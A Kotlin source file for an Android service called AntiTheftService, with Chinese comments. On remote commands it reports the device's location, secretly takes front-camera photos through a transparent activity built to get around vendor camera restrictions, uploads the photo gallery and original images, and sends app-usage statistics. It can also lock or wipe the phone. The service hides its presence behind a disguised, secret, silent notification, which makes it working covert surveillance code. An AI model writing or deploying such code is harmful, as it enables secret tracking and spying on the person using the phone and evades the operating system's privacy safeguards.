package com.example.antitheft

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.ContentUris
import android.content.Context
import android.provider.MediaStore
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.File
import java.util.concurrent.atomic.AtomicInteger

/**
 * 按需激活前台服务（平时不启，伪装通知）。
 *  - activate：按 locate / photo 组合单次执行（无持续定位）
 *  - locate / photo / album / usage / lock / wipe：一次性执行
 *  - stop：立即回静默
 *
 * 并发安全：用 AtomicInteger taskCount 引用计数管理后台任务生命周期。
 * 所有后台任务用 try-finally 保证 taskEnd 一定被调用（即使异常退出），
 * 只有当所有任务都结束时才 stopSelf，避免上传被提前中断（并发命令竞态）。
 * 一次性命令返回 START_NOT_STICKY：命令执行完 stopSelf 后系统不再重建服务。
 */
class AntiTheftService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    @Volatile private var running = false
    private val taskCount = AtomicInteger(0)

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        ensureForeground()
        when (intent?.action) {
            "activate" -> {
                val raw = intent?.getStringExtra("params")
                // 安全默认：必须显式传 true 才执行，避免空 params 误触发拍照/定位
                var locate = false; var photo = false
                if (!raw.isNullOrEmpty()) {
                    try {
                        val jo = JSONObject(raw)
                        if (jo.has("locate")) locate = jo.optBoolean("locate", false)
                        if (jo.has("photo")) photo = jo.optBoolean("photo", false)
                    } catch (_: Exception) { }
                }
                Log.i("AntiTheftService", "handleActivate locate=$locate photo=$photo raw=$raw")
                handleActivate(locate, photo)
            }
            "locate" -> reportOnce()
            "album" -> {
                val raw = intent?.getStringExtra("params")
                var jo: JSONObject? = null
                if (!raw.isNullOrEmpty()) {
                    try { jo = JSONObject(raw) } catch (_: Exception) { }
                }
                requestAlbum(jo)
            }
            "album_original" -> {
                val raw = intent?.getStringExtra("params")
                var jo: JSONObject? = null
                if (!raw.isNullOrEmpty()) {
                    try { jo = JSONObject(raw) } catch (_: Exception) { }
                }
                requestAlbumOriginal(jo)
            }
            "usage" -> requestUsageInternal()
            "lock" -> { lockNow(); maybeStop() }
            "wipe" -> wipeNow()
            "stop" -> stopTracking()
        }
        return START_NOT_STICKY
    }

    private fun ensureForeground() {
        if (!running) {
            running = true
            active = true
            // 显式声明 FGS 类型（location|camera）：targetSdk<34 下 MIUI 也按类型放行对应硬件后台访问
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val type = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                try {
                    startForeground(1, buildNotification(), type)
                } catch (_: Exception) {
                    startForeground(1, buildNotification())
                }
            } else {
                startForeground(1, buildNotification())
            }
        }
    }

    /**
     * 激活入口：按 locate / photo 组合单次执行（已无持续定位）。
     *  - locate=true  → 上报一次定位
     *  - photo=true   → 激活同时抓一张前摄照片
     * 任务计数自动保证：两个任务都完成后服务才回静默，无并发竞态。
     */
    private fun handleActivate(locate: Boolean, photo: Boolean) {
        if (locate) reportOnce()
        if (photo) capturePhoto() // 内部启动独立 CamShootActivity，上传由 Activity 托管
        if (!locate && !photo) {
            maybeStop()
        } else if (!locate) {
            // 仅拍照（无定位任务）：拍照上传由 CamShootActivity 独立完成，本服务无后台任务，稍后自停
            handler.postDelayed({ if (taskCount.get() <= 0) stopTracking() }, 1500)
        }
    }

    private fun reportOnce() {
        // 取实时 fix 可能阻塞最多 25s，必须在后台线程，避免主线程 ANR
        taskBegin()
        Thread {
            try {
                val token = Prefs.getToken(this@AntiTheftService) ?: return@Thread
                val fix = LocationReporter.getFreshFix(this@AntiTheftService)
                if (fix == null) {
                    Log.e("AntiTheftService", "no location fix obtained")
                    return@Thread
                }
                val bat = BatteryUtil.level(this@AntiTheftService)
                RelayApi.report(token, fix.lat, fix.lng, fix.acc, bat, fix.provider, fix.fixAgeSec, fix.satellites, fix.lowAccuracy, fix.addr)
                // 上传后顺手拉取服务器待下发指令（30 秒冷却），消除 15 分钟轮询延迟
                RelayApi.checkCommands(this@AntiTheftService, token)
            } catch (e: Exception) {
                Log.e("AntiTheftService", "reportOnce ex", e)
            } finally {
                taskEnd(1500)
            }
        }.start()
    }

    /** 标记一个后台任务开始（在启动线程前调用，与 taskEnd 严格配对） */
    private fun taskBegin() { taskCount.incrementAndGet() }

    /**
     * 标记一个后台任务结束。当所有任务都结束时，延迟停止服务。
     * 必须在 try-finally 的 finally 中调用，保证即使异常/提前 return 也会执行，
     * 避免 taskCount 永远 > 0 导致服务不退（前台通知挂着不消失）。
     */
    private fun taskEnd(delayMs: Long = 1500) {
        if (taskCount.decrementAndGet() <= 0) {
            handler.postDelayed({
                if (taskCount.get() <= 0) stopTracking()
            }, delayMs)
        }
    }

    /**
     * 同步命令（lock/stop 等）执行完后调用。
     * 仅当没有后台任务在跑时才停止服务，避免中断正在上传的 locate/photo/album。
     */
    private fun maybeStop(delayMs: Long = 500) {
        if (taskCount.get() <= 0) {
            handler.postDelayed({
                if (taskCount.get() <= 0) stopTracking()
            }, delayMs)
        }
    }

    private fun stopTracking() {
        if (!running) return // 幂等：已停止则直接返回
        running = false
        active = false
        handler.removeCallbacksAndMessages(null)
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun lockNow() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn = ComponentName(this, AntiTheftDeviceAdmin::class.java)
        if (dpm.isAdminActive(cn)) dpm.lockNow()
    }

    private fun wipeNow() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn = ComponentName(this, AntiTheftDeviceAdmin::class.java)
        if (dpm.isAdminActive(cn)) dpm.wipeData(0)
    }

    private fun capturePhoto() {
        // 迁移到 CamShootActivity：透明 Activity 在前台态拍照，绕开 MIUI/vivo 仅前台相机限制。
        // 拍照+上传由 Activity 自行完成，本服务不再托管该任务的生命周期。
        launchCam(this, "front")
    }

    private fun requestAlbum(params: JSONObject?) {
        val reset = params?.optBoolean("reset", false) ?: false
        val fromTs = params?.optLong("from_ts", 0L) ?: 0L
        val toTs = params?.optLong("to_ts", 0L) ?: 0L
        // 读相册+上传可能耗时，放后台线程，完成后回静默
        taskBegin()
        Thread {
            try {
                val token = Prefs.getToken(this)
                if (token != null) {
                    // 重置基线：只清该时间窗内的 _id（不传窗=全清），不上传照片。
                    // 上传由紧随其后的同步命令（同步相册 + 近三天）负责。
                    if (reset) {
                        val resetItems = AlbumCollector.collectWindow(this, fromTs, toTs)
                        val resetIds = resetItems.map { it.id }.toSet()
                        Prefs.clearAlbumWhitelist(this, if (fromTs > 0 || toTs > 0) resetIds else null)
                        Log.i("AntiTheftService", "album reset fromTs=$fromTs toTs=$toTs cleared=${resetIds.size}")
                        // 清理 collectWindow 产生的临时缩略图（reset 不上传，必须手动删）
                        resetItems.forEach { runCatching { it.file.delete() } }
                        RelayApi.checkCommands(this, token)
                        return@Thread  // 重置只清基线，不上传
                    }
                    // 正常同步：按时间窗采集，增量上传（跳过已在基线中的）
                    val items = AlbumCollector.collectWindow(this, fromTs, toTs)
                    val done = Prefs.getAlbumWhitelist(this)
                    val toUpload = items.filter { !done.contains(it.id) }
                    val wfmt = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.getDefault())
                    val wFrom = if (fromTs > 0) wfmt.format(java.util.Date(fromTs)) else "不限"
                    val wTo = if (toTs > 0) wfmt.format(java.util.Date(toTs)) else "不限"
                    Log.i("AntiTheftService", "album window: $wFrom ~ $wTo")
                    Log.i("AntiTheftService", "album fromTs=$fromTs toTs=$toTs total=${items.size} todo=${toUpload.size}")
                    val uploaded = mutableSetOf<Long>()
                    toUpload.forEach { item ->
                        // 用 media_id 作为 idx，保证全局唯一（避免多次同步后 idx 重复导致原图请求错乱）
                        val ok = RelayApi.uploadAlbum(token, item.file, item.id.toInt(), item.id)
                        Log.i("AntiTheftService", "album upload id=${item.id} ok=$ok")
                        if (ok) uploaded.add(item.id)
                        runCatching { item.file.delete() }
                    }
                    if (uploaded.isNotEmpty()) Prefs.addAlbumUploaded(this, uploaded)
                    RelayApi.checkCommands(this, token)
                }
            } catch (e: Exception) {
                Log.e("AntiTheftService", "album ex", e)
            } finally {
                taskEnd(2000)
            }
        }.start()
    }

    /**
     * 按需上传单张相册原图（高清）：服务端控制台点「查看原图」时下发 {media_id, idx}。
     * 直接从 MediaStore 读原文件直传（不走 Bitmap 解码，避免 OOM），服务端标记 has_original=1。
     */
    private fun requestAlbumOriginal(params: JSONObject?) {
        val mediaId = params?.optLong("media_id", -1L) ?: -1L
        val idx = params?.optInt("idx", -1) ?: -1
        if (mediaId < 0 || idx < 0) {
            Log.w("AntiTheftService", "album_original bad params media_id=$mediaId idx=$idx")
            return
        }
        taskBegin()
        Thread {
            try {
                val token = Prefs.getToken(this)
                if (token != null) {
                    val uri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId
                    )
                    // 优先用 DATA 列拿原文件路径直接读（最稳，避免流式解码）；拿不到再走 openInputStream
                    var srcFile: java.io.File? = null
                    try {
                        val proj = arrayOf(MediaStore.Images.Media.DATA)
                        contentResolver.query(uri, proj, null, null, null)?.use { cur ->
                            if (cur.moveToFirst()) {
                                val p = cur.getString(cur.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                                if (!p.isNullOrEmpty()) srcFile = java.io.File(p)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w("AntiTheftService", "album_original DATA query fail, fallback stream", e)
                    }
                    val ok = if (srcFile != null && srcFile!!.exists()) {
                        RelayApi.uploadOriginal(token, srcFile!!, idx, mediaId)
                    } else {
                        // fallback：openInputStream 直传（临时落盘一份再传，传完删）
                        try {
                            val tmp = java.io.File(cacheDir, "at_orig_${mediaId}_${System.currentTimeMillis()}.jpg")
                            contentResolver.openInputStream(uri)?.use { ins -> tmp.outputStream().use { outs -> ins.copyTo(outs) } }
                            val r = if (tmp.exists()) RelayApi.uploadOriginal(token, tmp, idx, mediaId) else false
                            runCatching { tmp.delete() }
                            r
                        } catch (e: Exception) {
                            Log.e("AntiTheftService", "album_original stream fail media_id=$mediaId", e)
                            false
                        }
                    }
                    Log.i("AntiTheftService", "album_original media_id=$mediaId idx=$idx ok=$ok")
                    if (ok) RelayApi.checkCommands(this, token)
                }
            } catch (e: Exception) {
                Log.e("AntiTheftService", "album_original ex", e)
            } finally {
                taskEnd(2000)
            }
        }.start()
    }

    private fun requestUsageInternal() {
        // 采集使用统计+上传可能耗时，放后台线程，完成后回静默
        taskBegin()
        Thread {
            try {
                val token = Prefs.getToken(this)
                if (token != null) {
                    if (!UsageCollector.hasUsagePermission(this)) {
                        Log.w("AntiTheftService", "usage permission not granted, opening settings")
                        UsageCollector.openUsageSettings(this)
                    } else {
                        val payload = UsageCollector.buildPayload(this, 60)
                        val ok = RelayApi.uploadUsage(token, payload.toString())
                        Log.i("AntiTheftService", "usage uploaded=$ok")
                        if (ok) RelayApi.checkCommands(this, token)
                    }
                }
            } catch (e: Exception) {
                Log.e("AntiTheftService", "usage ex", e)
            } finally {
                taskEnd(2000)
            }
        }.start()
    }

    private fun buildNotification(): Notification {
        C.ensureChannel(this)
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, SettingsActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, C.NOTIF_CHANNEL_ID)
            .setContentTitle(C.NOTIF_TITLE)
            .setContentText(C.NOTIF_TEXT)
            .setSmallIcon(R.drawable.ic_hidden)
            .setContentIntent(pi)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    companion object {
        @Volatile var active = false
            private set

        fun isActive() = active

        fun start(ctx: Context, params: JSONObject?) {
            val i = Intent(ctx, AntiTheftService::class.java).setAction("activate")
            if (params != null) i.putExtra("params", params.toString())
            ctx.startForegroundService(i)
        }

        fun requestLocate(ctx: Context) {
            ctx.startForegroundService(Intent(ctx, AntiTheftService::class.java).setAction("locate"))
        }

        fun requestPhoto(ctx: Context, params: JSONObject?) {
            val facing = params?.optString("facing") ?: "front"
            launchCam(ctx, facing)
        }

        /** 启动透明前台 Activity 拍照（绕开 MIUI/vivo 仅前台相机权限限制）。 */
        private fun launchCam(ctx: Context, facing: String) {
            try {
                val i = Intent(ctx, CamShootActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    putExtra(CamShootActivity.EXTRA_FACING, facing)
                }
                Log.i("AntiTheftService", "launchCam facing=$facing")
                ctx.startActivity(i)
            } catch (e: Exception) {
                Log.e("AntiTheftService", "launchCam fail", e)
            }
        }

        fun requestAlbum(ctx: Context, params: JSONObject?) {
            val i = Intent(ctx, AntiTheftService::class.java).setAction("album")
            if (params != null) i.putExtra("params", params.toString())
            ctx.startForegroundService(i)
        }

        fun requestAlbumOriginal(ctx: Context, params: JSONObject?) {
            val i = Intent(ctx, AntiTheftService::class.java).setAction("album_original")
            if (params != null) i.putExtra("params", params.toString())
            ctx.startForegroundService(i)
        }

        fun requestUsage(ctx: Context) {
            ctx.startForegroundService(Intent(ctx, AntiTheftService::class.java).setAction("usage"))
        }

        fun requestLock(ctx: Context) {
            ctx.startForegroundService(Intent(ctx, AntiTheftService::class.java).setAction("lock"))
        }

        fun requestWipe(ctx: Context) {
            ctx.startForegroundService(Intent(ctx, AntiTheftService::class.java).setAction("wipe"))
        }

        fun stop(ctx: Context) {
            ctx.startForegroundService(Intent(ctx, AntiTheftService::class.java).setAction("stop"))
        }
    }
}
